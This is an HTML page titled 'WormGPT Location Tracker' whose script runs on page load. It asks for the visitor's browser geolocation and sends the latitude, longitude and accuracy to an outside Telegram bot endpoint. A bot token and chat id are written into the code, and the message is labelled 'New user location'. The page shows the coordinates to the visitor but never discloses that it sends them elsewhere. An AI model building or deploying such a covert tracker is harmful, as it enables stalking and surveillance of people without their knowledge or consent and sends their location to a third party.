<!DOCTYPE html>
<html>
  <head>
    <title>WormGPT Location Tracker</title>
    <style>
      body {
        text-align: center;
        margin-top: 50px;
      }
      .button {
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>WormGPT Location Tracker</h1>
    <p id="demo"></p>
    <script>
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
        }
      }

      function showPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        const url = `https://api.telegram.org/bot6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E/sendMessage`;
        const data = {
          chat_id: '5990142501',
          text: `New user location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}`
        };

        fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        })
        .catch(error => {
          console.log(error);
        });

        document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon + "<br>Accuracy: " + accuracy;
      }

      getLocation();
    </script>
  </body>
</html>
